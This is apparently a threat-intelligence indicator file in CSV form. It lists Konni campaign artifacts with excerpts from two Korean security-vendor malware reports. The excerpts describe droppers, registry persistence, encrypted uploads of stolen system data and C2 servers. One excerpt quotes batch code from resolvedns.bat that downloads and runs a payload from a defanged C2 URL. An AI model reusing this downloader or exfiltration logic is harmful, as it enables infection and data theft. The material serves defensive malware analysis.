schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:e54fcc09b171b996e5fb03c6e4f8c683faf82ec36425ecbdb2de65362728d195,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 27 d. ‘30966118.bat’ ○ 본 파일은 ‘73888454.bat’ 명령에서 파일 존재 조건 성립과 레지스트리 등록 후 호출되는 배치 파일입니다. 파일명 30966118.bat MD5 b307e8e59113ddeb622f53ae37ade042 SHA1 d029fbeed3c0a1e535e7e7bbb48277afa105b835 SHA256 199a9bb434a86029f7ad3fe87b3e6d2478487502ef7b0125 69b3029b8fbc7e15 [표 13 ] 30966118.bat 파일 HASH 정보 화면 ○ ‘19288086.bat’ 파일 호출을 통해 C2(naver.cloudfiles001[.]com) 서버로 접근하고, 변수로 지정된 ‘85214.zip’ 파일 다운로드를 수행합니다. 분석 당시 해당 파일이 다운로드 되지는 않았습니다. 공격자는 감염된 컴퓨터명을 확인해 선별",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:37ad00a5db5ede87a0177e6c87daeef6367408954eb5e041cb71d6cac0821469,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:5f03f28b163282909f585611c65fbf285020e574e8951ea1c9b0f230563c8bb4,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:6cc93cfe24e287175619a3895f45135982f9c729d34dce0e0460c0947cff4c26,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 국세청사칭- 30966118.bat 북한인권단체사칭- resolvedns.bat call unzip.exe-P""a""""%~dp0%fn%.zip"" >nuldel /f /q%~dp0%fn%.zip>nul call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nul[표5-3] unzip.exe실행명령어부분비교화면 ○ 컴퓨터 내부 정보를 수집하는 명령을 비교해 보면, 확장자가 txt 파일에서 data이름으로 변경된 것 외에 64비트 OS 기반 프로그램 파일 경로가추가된것을알수있습니다. 국세청사칭-32981202.bat 북한인권단체사칭-versioninfo.bat [표5-4] 정보수집및유출명령부분비교화면 Genians SecurityCenter 35",
1.0.0,actor--konni,artifact--sha256:11627bcb09bed7efba0608d336e078b7b16dee059c211e3d7aec05908d0c4803,observation--sha256:d5692cb45b178dc8bcb12d1615ca1c7aab5039f77021dd12c2ca98a419c5c513,file-name,324093.zip,324093.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport install.vbs 1,652바이트 resolvedns.bat 호출 db31a36e1684c568fa3529d60a59ba29 versioninfo.bat 1,143바이트 시스템정보수집및anrun[.]kr 서버로유출시도 168bcc063501d191d82aaa3a32741a12 unactivate.vbs 6,644바이트 XMLHTTPPOSTContent-Typeform명령어 6b944c9dc4b760fffb56adf4fecf6764 resolvedns.bat 432바이트 anrun[.]kr 서버에서324093.zip다운로드및실행시도 892bd45372876d29e883e114981e311b activate.bat 2,331바이트 XMLHTTPGETAdodb.Stream명령어 b86c38ae5c24c55831d7f8ca3cbeb814 unzip.exe 167,936바이트 Unzip5.52압축해제정상유틸리티 75375c22c72f1beb7",
1.0.0,actor--konni,artifact--sha256:11627bcb09bed7efba0608d336e078b7b16dee059c211e3d7aec05908d0c4803,observation--sha256:817733e0157da760961c0834935c699504c59307ee5241e31a282ee1cb6a4812,file-name,324093.zip,324093.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 22}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport [그림4-2] 'install.vbs' XOR연산부분을ASCII 문자로치환한화면 ○ 27개의 연산 항목을 문자열로 변경하면 다음과 같이 Windows Script Host(WScript.Shell) 를사용하여'resolvedns.bat' 배치파일을호출하여실행하는것을알수있습니다. ■'activate.vbs' 파일코드분석 ○'activate.vbs' 파일은'resolvedns.bat' 파일에의해호출되는스크립트입니다. 해당스크립트는C2 서버( anrun[.]kr) 에서지정된컴퓨터명(% COMPUTERNAME%) 으로별도 조건에 따라 연결되며, 지정된 환경변수명( ttn) 과 zip 확장자가 결합된'324093.zip' 파일을다운로드하는데사용됩니다. OnError ResumeNext Genians SecurityCenter 21",
1.0.0,actor--konni,artifact--sha256:11627bcb09bed7efba0608d336e078b7b16dee059c211e3d7aec05908d0c4803,observation--sha256:24d8176053ba013855a4f0a2e5297ae3042cbdcd45f072b18b487e15807a4337,file-name,324093.zip,324093.zip,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:74eaa4ca8e4dee0ddcd6a6677ef8b82dcfaf9698d0907c3b3ea63332c067975f,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:7888a455ac9c8a56dd44f75c0e66f5ecb6a8ae458138287c3712ebdaeed42bc7,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:16dbd9741997705b95cdd9c21cbb46adca28b49214cea49a732e54983d90dc38,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:65cf1b4f46e5b0951da180ae26ce871ff05ed48035df169f087d3c04cecb924d,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 24 [그림 15] 73888454.bat 파일 내부 코드 화면 ○ 만약 ‘30966118.bat’ 파일이 없을 경우에는 ""upok.txt"" 파일이 존재하지 않을 경우에만 ‘32981202.bat’ 파일을 실행하는데, ‘upok.txt’ 파일은 컴퓨터 정보가 유출(Upload OK)될 때 만들어 집니다. ○ 그 다음 루틴은 ‘pakistan.txt’ 파일 존재 여부에 따라 (goto 1), (goto EXIT)로 분기됩니다. 처음 악성 파일이 작동할 때는 해당 파일이 존재하지 않기 때문에 (goto 1) 루틴으로 점프하게 됩니다. 만약 파일이 존재할 경우에는 (goto EXIT) 루틴은 ‘pakistan.txt’ 파일을 삭제하고 종료되는데, 일종의 ‘킬 스위치(Kill Switch)’와 같은 비상 종료 기능을 수행합니다. 이는 다수의 Konni 캠페인에서 지속적으로 사용중인 방식입니다.",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:9ad390cd46ebb0003207c7522dc2900fd86b10f7aa9a62943d2807d007c867f1,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 29}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 28 ○ 조건 분기에 따라 ‘85214.zip’ 파일이 존재하지 않으면, (goto END1) 루틴으로 이동해 주요 기능을 종료합니다. 만약 다운로드된 ‘85214.zip’ 파일이 존재할 경우 Powershell 명령으로 압축 파일을 확인하고, ‘unzip.exe’ 파일을 통해 미리 설정된 암호화 압축을 해제합니다. 그 다음 ‘rundll32.exe’ 파일로 추가 실행을 하는데, 해당 파일은 DLL 유형의 RAT 또는 Bot 형태일 가능성이 있습니다. [그림 22] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 23] 32981202.bat 에 의해 실행된 이벤트의 타임라인",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:1dc9597bccd46e44c37d8d7e6fa3270cf845a620a00309bf2bc1c91ccfa2df6e,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:7fd0ebfa188da99120a30c4b44a3ec23eff7a85fbfa88a4295a4e006b87ff8cd,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 31}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 30 e. ‘32981202.bat’ ○ ‘73888454.bat’ 파일에 의해 호출되는 ‘32981202.bat’ 파일은 피해 컴퓨터의 주요 정보를 수집하는 인포스틸러(InfoStealer) 목적의 정보탈취 기능을 수행합니다. 파일명 32981202.bat MD5 ee8cd48b48c39cbb869589a629702b7a SHA1 ba11648632e52bcb1754983fd4aa1c703bcad38f SHA256 f4751a93ac8d901fcd9a46dfdd3aee225745c8f05d1937635 ed8b53b5e428022 [표 11] 32981202.bat 파일 HASH 정보 화면 ○ 본 배치 파일은 사용자 컴퓨터의 주요 정보를 수집해 별도의 파일로 저장해 공격자가 운영하는 C2(overseeby[.]com) 서버로 전송하기 위한 준비작업을 합니다. [그림 18] 32981202.b,
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:2a40644d068b21966174f9517bdf436cb9ff297c015662104f57cf9721238422,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 32 [그림 19] 32981202.bat 에 의해 실행된 공격 스토리라인 [그림 20] 32981202.bat 에 의해 실행된 이벤트의 타임라인,
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:a9b4da552714607ffb99038c90d8562eb522ace2635add028b391d6493574174,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 34 g. ‘07856126.bat’ ○ 본 파일도 [RC4+Base64] 암호화 루틴을 가지고 있으며, 사용자 정보를 C2 서버로 유출할 때 암호화하는 용도로 사용이 됩니다. 파일명 07856126.bat MD5 14600ffc77c091a708a8df26b0043a84 SHA1 1953a2a6c8ec43230ae2eb920efe5d85d50b8cf4 SHA256 a9605c875079f350ffe66f2647289c5fea95ce5cdfecebe967 5bc6ed22c77dd7 [표 15] 07856126.bat 파일 HASH 정보 화면 ○ ‘32981202.bat’ 파일이 호출할 때 사용하며, 수집된 각종 정보 텍스트(txt) 파일을 암호화해 업로드할 때 사용되며, fn(filename), fd(filedata), r(rc4 key) 등이 함께 전송되고, 업로드가 완료되면 ‘upok.tx",
1.0.0,actor--konni,artifact--sha256:1315fd6068b80ae8d605eb6d2397cbd1607fb31732fab8edfb64454f1c8eaaaf,observation--sha256:8ea6b098d07aa6fbec1e6635a8d6aad18e0639f0eeb57745c6b89316cf7f34e8,file-name,32981202.bat,32981202.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
